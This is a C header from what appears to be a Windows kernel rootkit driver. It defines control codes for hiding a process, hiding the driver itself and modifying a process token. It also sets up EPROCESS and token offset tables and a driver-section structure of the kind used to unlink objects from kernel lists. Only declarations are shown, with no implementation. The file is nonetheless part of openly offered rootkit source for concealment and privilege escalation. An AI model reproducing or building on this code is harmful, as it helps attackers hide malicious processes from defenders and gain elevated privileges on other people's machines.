#pragma once
//#define LOG_OFF

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned char BYTE;
typedef struct offset {
	BOOL isSupported;
	DWORD ProcPID;
	DWORD ProcName;
	DWORD ProcLinks;
	DWORD DriverSection;
	DWORD Token;
	DWORD nSIDS;
	DWORD PrivPresent;
	DWORD PrivEnable;
	DWORD PrivDefaultEnable;
}offset,*poffset;

typedef struct _DRIVER_SECTION {
	LIST_ENTRY listEntry;
	DWORD field1[4];
	DWORD field2;
	DWORD field3;
	DWORD field4;
	UNICODE_STRING filePath;
	UNICODE_STRING fileName;
	//......and who knows what else
}DRIVER_SECTION,*PDRIVER_SECTION;

#define FILE_DEVICE_RK 0x00008001
#define STATUS_OS_NOT_SUPPORT -1;
#define IOCTL_TEST_HIDEME CTL_CODE(FILE_DEVICE_RK,0x801,METHOD_BUFFERED,FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_TEST_HIDEDRIVER CTL_CODE(FILE_DEVICE_RK,0x802,METHOD_BUFFERED,FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_TEST_MODIFYTOOKEN CTL_CODE(FILE_DEVICE_RK,0x803,METHOD_BUFFERED,FILE_READ_DATA|FILE_WRITE_DATA)

#define SZ_EPROCESS_NAME 0x010
#define EPROCESS_OFFSET_PID Offset.ProcPID
#define EPROCESS_OFFSET_NAME Offset.ProcName
#define EPROCESS_OFFSET_LINKS Offset.ProcLinks
#define OFFSET_DRIVERSECTION Offset.DriverSection
#define EPROCESS_OFFSET_TOKEN Offset.Token
#define TOKEN_OFFSET_PRIV Offset.PrivPresent
#define TOKEN_OFFSET_ENABLED Offset.PrivEnable
#define TIKEN_OFFSET_DEFAULT Offset.PrivDefaultEnable
